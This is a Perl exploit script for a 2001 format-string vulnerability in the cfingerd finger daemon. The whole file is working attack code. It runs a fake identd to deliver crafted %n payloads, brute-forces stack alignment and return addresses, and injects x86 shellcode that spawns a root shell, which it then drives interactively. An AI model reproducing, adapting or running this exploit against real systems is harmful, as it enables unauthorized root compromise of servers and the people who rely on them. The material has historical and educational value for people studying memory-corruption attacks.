#!/usr/bin/perl
# Cfingerd exploit to the recent syslog format bug.
# Discovered and written by Lez <abullah@freemail.hu> in 2001.
# you have to use it as root to bind port 113.

# tested on Debian 2.1, 2.2

use IO::Socket;
#use strict;

my $network_timeout=5;
my $sleep_between_fingers=2;  # should be enough
my $debug_sleep=0;

my $fingerport=79;
my $target=$ARGV[0];
my $debug=1;
my $test_vulnerability=1;

# Debian 2.2, cfingerd 1.4.1-1
#my $control=33;  # if don't set it, exploit will find.
#my $align=0;     # the same
#$retaddr=0xbffffab0;
# my $retaddr=0xbffff880;  # the same
#$retaddr=0xbffff840;


my $retvalue=0xbffff980;  # If it finds everything correctly, and says Shell lunched, but
                          # you can't find your uid 0, decrease $retvalue by 30.
my $bytes_written=32;

#$control=17;
#$align=0;
#$retaddr=0xbffffb80;   #(or 0xbffffb68 0xbffff9d0 0xbffff9cc 0xbffff9c8)
#$retvalue=0xbffffc20;
#$bytes_written=32;



# GOOD:
my $startsig11=0xbffffbfc;
my $endsig11=  0xbffff000;

my $controlstart=45;
my $controlend=1;

my $fclient;

my $shellcode ="\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xb0\x2e\xcd\x80".
            "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b".
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd".
            "\x80\xe8\xdc\xff\xff\xff/bin/sh";
                                                        #59 bytes

if (!$target) {print "Usage: $0 target\n";exit}

# Starting fake identd
my $identd = IO::Socket::INET->new(
                Listen => 5,
                LocalPort => 113,
                Proto     => 'tcp',
                Reuse     => 3) or die "Cannot listen to port 113: $!\n";

if ($test_vulnerability) {&testvuln}

if (!$control) { &get_control_and_align }
else {print "Alignment: $align\nControl: $control\n" }

if (!$retaddr) {
    &find_and_exploit_sigsegv_values
}
else {
    printf "Using provided RET address: 0x%x\n",$retaddr;
    &exploit ($retaddr, $retvalue);
}


exit;




sub sendthisone { #sends a string to cfingerd, and returns 1 if the remote machine got SIGSEGV or SIGILL.
                  # a bit tricky
    my $text_to_send=$_[0];

    $text_to_send =~ s/^\ /\ \ /;

    my ($last_119, $gotback);

    $fclient = IO::Socket::INET->new("$target:$fingerport") or die "Cannot connect to $target: $!\n";
    print $fclient "e\n"; # e is the username we query.

    my $ident_client = $identd-> accept;

    my $tmp=<$ident_client>;


    my $first_64= substr($text_to_send, 0, 64);
    if (length($text_to_send) > 64) {
        $last_119= substr($text_to_send,64);
    }

    sleep $debug_sleep;

    print $ident_client "$last_119: : :$first_64\n"; # we use an other bug
                                                     # in rfc query function
                                                     # to send longer lines.
    close $ident_client;

    eval {
        local $SIG{ALRM} = sub { die "alarm\n"};
        alarm ($network_timeout);
        $gotback= <$fclient>;
        alarm 0;
    };
    if ($@) {
        die unless $@ eq "alarm\n";
        &shell;
    }

    if ($gotback =~ /SIGSEGV/i) {
        if ($debug == 2) {print "Sending $first_64$last_119: SIGSEGV\n";}
        elsif ($debug == 1) {system ("echo -n \"*\"");}
        sleep ($sleep_between_fingers);
        return 1;
    } elsif ($gotback =~ /SIGILL/i) {
        if ($debug == 2) {print "Sending $first_64$last_119: SIGILL\n";}
        elsif ($debug == 1) {system ("echo -n +");}
        print "Got signal \"Illegal instruction\".\nThe ret address is not correct\n";
        sleep ($sleep_between_fingers);
        return 1;
    } else {
        if ($debug == 2) {print "Sending $first_64$last_119\n";}
        elsif ($debug == 1) {system ("echo -n .");}
        sleep ($sleep_between_fingers);
        return 0;
    }
}


sub get_control_and_align {
    for ($control=$controlstart; $control >= $controlend; $control--) {
        for ($align=3; $align>=0; $align--) {
            my $s1= "A"x$align . "\x79\xff\xff\xbe" . "%" . $control . "\$n";
            my $s2= "A"x$align . "\x79\xff\xff\xbf" . "%" . $control . "\$n";

            if (sendthisone($s1) > sendthisone ($s2)) {
                print "\nControl: $control\nAlign: $align\n";
                return;
            }
        }
    }
    die "Could not find control and alignment values\n";
}

sub find_and_exploit_sigsegv_values {
    my ($sendbuf, @back, $addy, $retaddr, $save);

    print "Searching for eip addresses...\n";

    for ($addy=$startsig11; $addy >= $endsig11; $addy -=4) {
        $sendbuf = "a"x$align . pack "cccc",$addy,$addy>>8,$addy>>16,$addy>>24;
        $sendbuf .= "%" . $control . "\$n";

        if ($addy%0x100) {
            if (sendthisone($sendbuf)) {

                &exploit ($addy, $retvalue);    # I'm so lazy
                &exploit ($addy, $retvalue-60);
                &exploit ($addy, $retvalue+60);
                &exploit ($addy, $retvalue-120);
                &exploit ($addy, $retvalue+120);
                &exploit ($addy, $retvalue-180);
                &exploit ($addy, $retvalue+180);
                &exploit ($addy, $retvalue-240);
                &exploit ($addy, $retvalue+240);
                &exploit ($addy, $retvalue-300);
                &exploit ($addy, $retvalue+300);
                &exploit ($addy, $retvalue-360);
                &exploit ($addy, $retvalue+360);
                &exploit ($addy, $retvalue-420);
                &exploit ($addy, $retvalue+420);

            }
        }
    }
}

sub exploit {

    my $addy=$_[0];
    my $value=$_[1];

    my $sendbuf;

    printf "\nExploiting 0x%x, ret:0x%x.\n",$addy,$value;

    $sendbuf = "Z"x$align;
    $sendbuf .= &add_four_addresses($addy);
    $sendbuf .= &add_format_strings($value);

    $sendbuf .= "\x90"x (182-length($sendbuf)-length($shellcode));
    $sendbuf .= $shellcode;

    &sendthisone ($sendbuf);
}

sub add_four_addresses {
    my $addy=$_[0];
    my ($back, $i);

    for ($i=0; $i<=3; $i++) {
        $back .= pack "cccc",
                    ($addy+$i),
                    ($addy+$i)>>8,
                    ($addy+$i)>>16,
                    ($addy+$i)>>24;
    }
    return $back;
}

sub add_format_strings {
    my ($back, $i, @a, $xvalue, $nvalue, $back);
    my $ret=$_[0];

    $a[0]=$ret%0x100-$bytes_written;

    for ($i=1; $i<=3; $i++) {
        $a[$i]= ($ret >> (8*$i) )%0x100 - ($ret >> (8*($i-1)) )%0x100;
    }

    for ($i=0; $i<=3; $i++) {
        $xvalue= &positive($a[$i]);
        $nvalue= $control+$i;

        if ($xvalue <=8) {
            $back .= "A"x$xvalue          .       "%".$nvalue."\$n";
        } else {
            $back .= "%0".$xvalue."x"     .       "%".$nvalue."\$n";
        }
    }
    return $back;
}

sub positive {
    my $number=$_[0];
    while ($number < 0) {
        $number += 0x100;
    }
    return $number;
}

sub shell {
    my ($cucc, $msg);

    print "Shell launched\n";
    print $fclient "id\n";
    print &my_line(1);

    while (1) {
        $cucc=<STDIN>;
        print $fclient $cucc;

        while ($msg=&my_line(1)) {
            print $msg;
        }
    }
}

sub my_line {
    my $msg;
    eval {
        local $SIG{ALRM} = sub { die "\n"};
        alarm ($_[0]);
        if ($msg=<$fclient>) {
            alarm (0);
            return $msg;
        }
    };
}

sub testvuln {
    if ($debug) {print "Testing if fingerd is vulnerable...   "}
    if (&sendthisone ("%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n")) {
        print "Yes.\n";
        return;
    } else {
        print "No.\n";
        exit;
    }
}

